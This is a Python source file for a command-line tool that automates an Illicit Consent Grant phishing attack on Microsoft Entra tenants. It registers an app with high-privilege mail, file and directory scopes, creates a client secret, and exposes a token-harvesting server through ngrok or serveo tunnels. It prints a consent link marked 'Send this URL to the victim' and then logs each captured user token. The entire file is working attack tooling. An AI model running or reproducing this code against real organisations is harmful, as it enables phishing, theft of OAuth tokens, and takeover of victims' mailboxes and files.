from __future__ import annotations

import json
import logging
import os
import re
import subprocess
import sys
import tempfile
import time
import urllib.request
from pathlib import Path
from typing import Optional

import requests
import typer
from rich.console import Console

log = logging.getLogger(__name__)
console = Console(stderr=True)

PYNAUTH_DIR = Path(__file__).resolve().parent.parent.parent.parent / "tools" / "pynauth"

AZURE_CLI_CLIENT_ID = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
GRAPH_RESOURCE_ID = "00000003-0000-0000-c000-000000000000"
GRAPH_BASE = "https://graph.microsoft.com/v1.0"

GRAPH_SCOPE_IDS = {
    "User.Read": "e1fe6dd8-ba31-4d61-89e7-88639da4683d",
    "User.Read.All": "a154be20-db9c-4678-8ab7-66f6cc099a59",
    "Mail.Read": "810c84a8-4a9e-49e6-bf7d-12d183f40d01",
    "Mail.ReadWrite": "e2a3a72e-5f79-4c64-b1b1-878b1b3c59b9",
    "Mail.Send": "e383f46e-2787-4529-855e-0e146a0f4a1f",
    "Files.ReadWrite.All": "863451f7-0667-45fd-a0b6-7a1e4fa1e3e1",
    "Sites.ReadWrite.All": "89fe6a52-9e0c-4bf9-a8e7-196dab5a1f52",
    "Directory.Read.All": "06da0dbc-49e2-44d2-8312-53f166ab848a",
}

HIGH_PRIV_SCOPES = [
    "User.Read.All",
    "Mail.Read",
    "Mail.ReadWrite",
    "Mail.Send",
    "Files.ReadWrite.All",
    "Sites.ReadWrite.All",
    "Directory.Read.All",
]

WRAPPER_TEMPLATE = '''"""PynAuth runner — injected by fenrir consent."""
import json
import os
import sys
import types

cfg_path = os.environ["FENRIR_PYNAUTH_CFG"]
PYNAUTH_DIR = os.environ["FENRIR_PYNAUTH_DIR"]

with open(cfg_path) as f:
    CFG = json.load(f)

mod = sys.modules.get("app_config")
if mod is None:
    mod = types.ModuleType("app_config")
    mod.__file__ = os.path.join(PYNAUTH_DIR, "app_config.py")
    sys.modules["app_config"] = mod

for _key, _val in CFG.items():
    setattr(mod, _key, _val)

sys.path.insert(0, PYNAUTH_DIR)
os.chdir(PYNAUTH_DIR)

import app as pynauth_app

app = pynauth_app.app
if __name__ == "__main__":
    port = int(os.environ.get("FENRIR_PYNAUTH_PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
'''


# ---------------------------------------------------------------------------
# Tunnel helpers
# ---------------------------------------------------------------------------

def _find_ngrok() -> str | None:
    for p in os.environ.get("PATH", "").split(os.pathsep):
        candidate = Path(p) / "ngrok"
        if candidate.exists():
            return str(candidate)
    return None


def _start_ngrok(port: int) -> str | None:
    ngrok = _find_ngrok()
    if not ngrok:
        return None
    subprocess.Popen([ngrok, "http", str(port), "--log=stdout"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(15):
        time.sleep(1)
        try:
            req = urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels")
            data = json.loads(req.read())
            for t in data.get("tunnels", []):
                if t.get("proto") == "https":
                    return t["public_url"]
        except Exception:
            pass
    return None


def _start_serveo(port: int) -> str | None:
    serveo_log = Path("/tmp/fenrir_serveo.log")
    with open(serveo_log, "w") as f:
        proc = subprocess.Popen(
            ["ssh", "-o", "StrictHostKeyChecking=no", "-R", f"80:localhost:{port}", "serveo.net"],
            stdout=f, stderr=subprocess.STDOUT,
        )
    for _ in range(10):
        time.sleep(2)
        if serveo_log.exists():
            text = serveo_log.read_text()
            m = re.search(r"https://\S+\.serveousercontent\.com", text)
            if m:
                return m.group(0)
    proc.kill()
    return None


# ---------------------------------------------------------------------------
# PynAuth lifecycle
# ---------------------------------------------------------------------------

def _start_pynauth(client_id: str, client_secret: str, tenant: str,
                   scope_list: list[str], tunnel_url: str | None,
                   port: int, redirect_path: str) -> subprocess.Popen:
    config = {
        "CLIENT_SECRET": client_secret,
        "AUTHORITY": f"https://login.microsoftonline.com/{tenant}",
        "CLIENT_ID": client_id,
        "REDIRECT_PATH": redirect_path,
        "ENDPOINT": "https://graph.microsoft.com/v1.0/users",
        "SCOPE": scope_list,
        "SESSION_TYPE": "filesystem",
    }

    cfg_dir = Path(tempfile.mkdtemp(prefix="fenrir_consent_"))
    cfg_file = cfg_dir / "pynauth_cfg.json"
    cfg_file.write_text(json.dumps(config))
    wrapper_file = cfg_dir / "run_pynauth.py"
    wrapper_file.write_text(WRAPPER_TEMPLATE)

    console.print(f"[cyan]▶ Starting PynAuth on port {port}...[/cyan]")
    env = os.environ.copy()
    env["FENRIR_PYNAUTH_CFG"] = str(cfg_file)
    env["FENRIR_PYNAUTH_DIR"] = str(PYNAUTH_DIR)
    env["FENRIR_PYNAUTH_PORT"] = str(port)
    proc = subprocess.Popen(
        [sys.executable, str(wrapper_file)],
        cwd=str(PYNAUTH_DIR),
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    time.sleep(3)
    if proc.poll() is not None:
        out, _ = proc.communicate()
        console.print(f"[red]PynAuth exited immediately:[/red] {out.decode()}")
        raise typer.Exit(code=3)
    return proc


def _wait_for_tokens(proc: subprocess.Popen, token_dir: Path):
    token_file = token_dir / "tokenLibrary.pickle"
    captured = set()
    try:
        while True:
            if token_file.exists():
                try:
                    import pickle
                    with open(token_file, "rb") as f:
                        lib = pickle.load(f)
                    for user in lib:
                        if user not in captured:
                            captured.add(user)
                            tok = lib[user]
                            expires = tok.get("expires_in", "?")
                            console.print(
                                f"  [green]✓ Token captured![/green] "
                                f"[bold]{user}[/bold] "
                                f"(expires in {expires}s)"
                            )
                except Exception:
                    pass
            time.sleep(2)
    except KeyboardInterrupt:
        console.print("\n[yellow]Shutting down...[/yellow]")
        proc.terminate()
        proc.wait()
        console.print("[green]Done.[/green]")


# ---------------------------------------------------------------------------
# Graph API helpers (auto mode)
# ---------------------------------------------------------------------------

def _graph_device_auth(scopes: list[str]) -> dict:
    import msal
    app = msal.PublicClientApplication(
        AZURE_CLI_CLIENT_ID,
        authority="https://login.microsoftonline.com/organizations",
    )
    flow = app.initiate_device_flow(scopes=scopes)
    if "user_code" not in flow:
        console.print(f"[red]Device flow init failed: {flow}[/red]")
        raise typer.Exit(1)
    console.print(f"[yellow]{flow['message']}[/yellow]")
    result = app.acquire_token_by_device_flow(flow)
    if "access_token" not in result:
        console.print(f"[red]Auth failed: {result.get('error_description')}[/red]")
        raise typer.Exit(1)
    console.print("[green]✓ Authenticated to Graph API[/green]")
    return result


def _graph_get(access_token: str, path: str) -> dict:
    resp = requests.get(
        f"{GRAPH_BASE}{path}",
        headers={"Authorization": f"Bearer {access_token}",
                 "Content-Type": "application/json"},
    )
    if resp.status_code >= 400:
        console.print(f"[red]Graph GET {path} failed ({resp.status_code}): {resp.text}[/red]")
        resp.raise_for_status()
    return resp.json()


def _graph_post(access_token: str, path: str, body: dict) -> dict:
    resp = requests.post(
        f"{GRAPH_BASE}{path}",
        headers={"Authorization": f"Bearer {access_token}",
                 "Content-Type": "application/json"},
        json=body,
    )
    if resp.status_code >= 400:
        console.print(f"[red]Graph POST {path} failed ({resp.status_code}): {resp.text}[/red]")
        resp.raise_for_status()
    return resp.json()


def _graph_patch(access_token: str, path: str, body: dict) -> dict:
    resp = requests.patch(
        f"{GRAPH_BASE}{path}",
        headers={"Authorization": f"Bearer {access_token}",
                 "Content-Type": "application/json"},
        json=body,
    )
    if resp.status_code >= 400:
        console.print(f"[red]Graph PATCH {path} failed ({resp.status_code}): {resp.text}[/red]")
        resp.raise_for_status()
    return {} if resp.status_code == 204 else resp.json()


def _check_can_register_apps(access_token: str) -> bool:
    data = _graph_get(access_token, "/policies/authorizationPolicy")
    allowed = (data.get("defaultUserRolePermissions") or {}).get("allowedToCreateApps", False)
    console.print(
        f"  {'[green]✓' if allowed else '[red]✗'} "
        f"Users can register applications: {allowed}"
    )
    return allowed


def _register_app(access_token: str, display_name: str, redirect_uri: str) -> tuple[str, str]:
    body = {
        "displayName": display_name,
        "signInAudience": "AzureADMultipleOrgs",
        "publicClient": {
            "redirectUris": [redirect_uri],
        },
    }
    data = _graph_post(access_token, "/applications", body)
    app_id = data["appId"]
    obj_id = data["id"]
    console.print(f"[green]✓ App registered:[/green] {display_name} (appId={app_id})")
    return app_id, obj_id


def _add_permissions(access_token: str, app_obj_id: str, scopes: list[str]):
    resource_access = []
    for s in scopes:
        sid = GRAPH_SCOPE_IDS.get(s)
        if sid:
            resource_access.append({"id": sid, "type": "Scope"})
        else:
            console.print(f"  [yellow]⚠ Unknown scope ID for {s}, skipping[/yellow]")

    body = {
        "requiredResourceAccess": [
            {
                "resourceAppId": GRAPH_RESOURCE_ID,
                "resourceAccess": resource_access,
            }
        ]
    }
    _graph_patch(access_token, f"/applications/{app_obj_id}", body)
    console.print(f"[green]✓ Added {len(resource_access)} delegated permission(s)[/green]")


def _add_client_secret(access_token: str, app_obj_id: str, label: str) -> str:
    from datetime import datetime, timedelta
    end = (datetime.utcnow() + timedelta(days=365)).strftime("%Y-%m-%dT%H:%M:%SZ")
    body = {
        "passwordCredential": {
            "displayName": label,
            "endDateTime": end,
        }
    }
    data = _graph_post(access_token, f"/applications/{app_obj_id}/addPassword", body)
    secret = data["secretText"]
    console.print("[green]✓ Client secret generated[/green]")
    return secret


def _update_redirect_uri(access_token: str, app_obj_id: str, redirect_uri: str):
    body = {
        "publicClient": {
            "redirectUris": [redirect_uri],
        },
    }
    _graph_patch(access_token, f"/applications/{app_obj_id}", body)
    console.print(f"[green]✓ Redirect URI updated:[/green] {redirect_uri}")


def _check_app_permissions(access_token: str, app_obj_id: str):
    data = _graph_get(access_token, f"/applications/{app_obj_id}")
    console.print(f"[cyan]  App object ID:[/cyan] {data.get('id')}")
    console.print(f"[cyan]  App ID:[/cyan] {data.get('appId')}")
    console.print(f"[cyan]  Sign-in audience:[/cyan] {data.get('signInAudience')}")


# ---------------------------------------------------------------------------
# Auto-mode orchestrator
# ---------------------------------------------------------------------------

def _auto_flow(
    tenant: str,
    scopes_override: str | None,
    port: int,
    tunnel_service: str,
    app_name: str,
):
    scope_list = (scopes_override or " ".join(HIGH_PRIV_SCOPES)).split()
    high_priv = [s for s in scope_list if s in GRAPH_SCOPE_IDS]

    graph_scopes = ["https://graph.microsoft.com/User.Read",
                    "https://graph.microsoft.com/Application.ReadWrite.All",
                    "https://graph.microsoft.com/Directory.Read.All"]

    console.print("[bold]▶ Step 1: Authenticate to Graph API[/bold]")
    token = _graph_device_auth(graph_scopes)
    access_token = token["access_token"]

    console.print("[bold]▶ Step 2: Check if users can register applications[/bold]")
    if not _check_can_register_apps(access_token):
        console.print("[red]✗ Users cannot register applications in this tenant.[/red]")
        console.print("[yellow]  Auto mode requires this setting to be enabled.[/yellow]")
        console.print("[yellow]  Either enable it in the Entra admin center or use manual mode.[/yellow]")
        raise typer.Exit(code=10)

    console.print("[bold]▶ Step 3: Start tunnel[/bold]")
    tunnel_url = None
    if tunnel_service == "ngrok":
        tunnel_url = _start_ngrok(port)
        if not tunnel_url:
            console.print("[yellow]ngrok failed, trying serveo...[/yellow]")
            tunnel_url = _start_serveo(port)
    elif tunnel_service == "serveo":
        tunnel_url = _start_serveo(port)
    if tunnel_url:
        console.print(f"[green]✓ Tunnel URL:[/green] {tunnel_url}")
    else:
        console.print("[yellow]⚠ No tunnel URL — using localhost redirect[/yellow]")

    local_redirect = f"http://localhost:{port}/getAToken"
    final_redirect = f"{tunnel_url}/getAToken" if tunnel_url else local_redirect

    console.print("[bold]▶ Step 4: Register application[/bold]")
    app_id, obj_id = _register_app(access_token, app_name, local_redirect)

    console.print("[bold]▶ Step 5: Add delegated API permissions[/bold]")
    _add_permissions(access_token, obj_id, high_priv)

    console.print("[bold]▶ Step 6: Generate client secret[/bold]")
    app_secret = _add_client_secret(access_token, obj_id, "fenrir-auto-secret")

    if tunnel_url:
        console.print("[bold]▶ Step 7: Update redirect URI with tunnel URL[/bold]")
        _update_redirect_uri(access_token, obj_id, final_redirect)

    _check_app_permissions(access_token, obj_id)

    console.print()
    console.print("=" * 60)
    console.print("  [bold green]App provisioned — ready for consent attack[/bold green]")
    console.print()
    console.print(f"  [bold]Client ID:[/bold]     {app_id}")
    console.print(f"  [bold]Client Secret:[/bold] {app_secret}")
    console.print(f"  [bold]Tenant:[/bold]        {tenant}")
    console.print(f"  [bold]Scopes:[/bold]        {' '.join(high_priv)}")
    console.print()
    console.print(f"  [bold]Consent URL:[/bold]")
    console.print(f"  https://login.microsoftonline.com/{tenant}/oauth2/v2.0/authorize"
                  f"?client_id={app_id}"
                  f"&response_type=code"
                  f"&redirect_uri={final_redirect}"
                  f"&response_mode=query"
                  f"&scope={' '.join(high_priv)}")
    console.print()
    console.print("  [dim]Send this URL to the victim.[/dim]")
    console.print("=" * 60)
    console.print()

    proc = _start_pynauth(
        client_id=app_id,
        client_secret=app_secret,
        tenant=tenant,
        scope_list=high_priv,
        tunnel_url=tunnel_url,
        port=port,
        redirect_path="/getAToken",
    )
    _wait_for_tokens(proc, PYNAUTH_DIR)


# ---------------------------------------------------------------------------
# Typer app
# ---------------------------------------------------------------------------

CONSENT_APP = typer.Typer(
    name="consent",
    help="Launch Illicit Consent Grant attack (starts PynAuth behind a tunnel).",
    no_args_is_help=True,
)


@CONSENT_APP.callback(invoke_without_command=True)
def consent(
    ctx: typer.Context,
    client_id: Optional[str] = typer.Option(
        None, "--client-id", help="Azure app client ID (required without --auto)",
        envvar="FENRIR_CLIENT_ID",
    ),
    client_secret: Optional[str] = typer.Option(
        None, "--client-secret", help="Azure app client secret (required without --auto)",
        envvar="FENRIR_CLIENT_SECRET", hide_input=True,
    ),
    tenant: str = typer.Option(
        "common", "--tenant", "-t", help="Tenant ID or 'common' for multi-tenant",
        envvar="FENRIR_TENANT",
    ),
    scopes: Optional[str] = typer.Option(
        None, "--scopes", "-s",
        help="Space-separated OAuth scopes (defaults to high-priv set with --auto)",
    ),
    port: int = typer.Option(
        5000, "--port", "-p", help="Local port for the Flask app",
    ),
    tunnel: str = typer.Option(
        "ngrok", "--tunnel", help="Tunneling service: ngrok (default) or serveo",
    ),
    auto: bool = typer.Option(
        False, "--auto",
        help="Auto-provision an app in Azure AD via Graph API",
    ),
    app_name: str = typer.Option(
        "fenrir-auto-consent", "--app-name", help="Display name for the auto-registered app",
    ),
):
    if not PYNAUTH_DIR.exists():
        console.print(f"[red]PynAuth not found at {PYNAUTH_DIR}[/red]")
        console.print("Clone it: git clone https://github.com/Synzack/PynAuth.git")
        raise typer.Exit(code=1)

    if auto:
        tenant_id = tenant if tenant != "common" else "organizations"
        _auto_flow(
            tenant=tenant_id,
            scopes_override=scopes,
            port=port,
            tunnel_service=tunnel,
            app_name=app_name,
        )
        return

    if not client_id:
        console.print("[red]--client-id is required (or use --auto to provision one)[/red]")
        raise typer.Exit(code=2)
    if not client_secret:
        console.print("[red]--client-secret is required (or use --auto to provision one)[/red]")
        raise typer.Exit(code=2)

    scope_list = (scopes or "User.Read User.Read.All Mail.Read Mail.ReadWrite Mail.Send "
                  "Files.ReadWrite.All Sites.ReadWrite.All Directory.Read.All").split()

    console.print(f"[cyan]▶ Starting tunnel ({tunnel})...[/cyan]")
    tunnel_url = None
    if tunnel == "ngrok":
        tunnel_url = _start_ngrok(port)
        if not tunnel_url:
            console.print("[yellow]ngrok failed/timed out, trying serveo...[/yellow]")
            tunnel_url = _start_serveo(port)
    elif tunnel == "serveo":
        tunnel_url = _start_serveo(port)
    else:
        console.print(f"[red]Unknown tunnel: {tunnel} (use ngrok or serveo)[/red]")
        raise typer.Exit(code=2)

    if tunnel_url:
        console.print(f"[green]✓ Tunnel URL:[/green] {tunnel_url}")
    else:
        console.print("[yellow]No tunnel URL obtained. Starting locally only.[/yellow]")

    redirect_path = "/getAToken"
    redirect_uri = f"{tunnel_url}{redirect_path}" if tunnel_url else f"http://localhost:{port}{redirect_path}"

    proc = _start_pynauth(
        client_id=client_id,
        client_secret=client_secret,
        tenant=tenant,
        scope_list=scope_list,
        tunnel_url=tunnel_url,
        port=port,
        redirect_path=redirect_path,
    )

    console.print()
    console.print("=" * 60)
    console.print("  [bold yellow]Illicit Consent Grant — Ready[/bold yellow]")
    console.print()
    console.print(f"  [bold]Victim URL:[/bold]       {tunnel_url or f'http://localhost:{port}'}")
    console.print(f"  [bold]Redirect URI:[/bold]     {redirect_uri}")
    console.print(f"  [bold]Scopes:[/bold]           {' '.join(scope_list)}")
    console.print()
    console.print("  [dim]Register this redirect URI in your Azure app:[/dim]")
    console.print(f"  [bold]{redirect_uri}[/bold]")
    console.print()
    console.print("  [dim]Waiting for tokens... (Ctrl+C to stop)[/dim]")
    console.print("=" * 60)
    console.print()

    _wait_for_tokens(proc, PYNAUTH_DIR)
